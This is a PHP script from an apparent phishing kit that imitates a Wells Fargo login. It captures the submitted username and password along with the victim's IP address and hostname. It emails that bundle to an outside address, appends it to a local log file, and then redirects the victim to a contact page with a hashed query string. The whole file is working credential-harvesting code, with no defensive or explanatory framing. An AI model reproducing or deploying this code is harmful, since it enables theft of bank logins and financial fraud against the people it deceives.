<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "---------WF Login---------\n";
$message .= "Username: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "---------By JeRo---------\n";
$message .= "IP: ".$ip."\n";
$message .= "Hostname: $hostname\n";
$message .= "---------WF 2020--------\n";
$recipient = "elsaid.1999@yahoo.com";
$headers = "From: USER <mail@jero.com>";
$subject = "Wells USER $ip";
mail($recipient,$subject,$message,$headers);
$file = fopen("max11122.txt", 'a');
fwrite($file, $message);

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

header("Location: contact.html?$host$host$host-$host$host$host");
?>